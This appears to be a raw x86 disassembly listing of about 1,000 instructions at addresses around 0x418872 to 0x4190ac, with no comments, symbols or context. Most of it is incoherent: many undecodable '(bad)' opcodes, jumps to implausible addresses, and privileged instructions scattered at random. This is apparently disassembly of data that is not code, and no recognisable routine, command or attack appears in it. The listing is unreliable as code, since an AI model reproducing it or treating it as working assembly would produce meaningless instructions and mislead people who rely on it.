  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
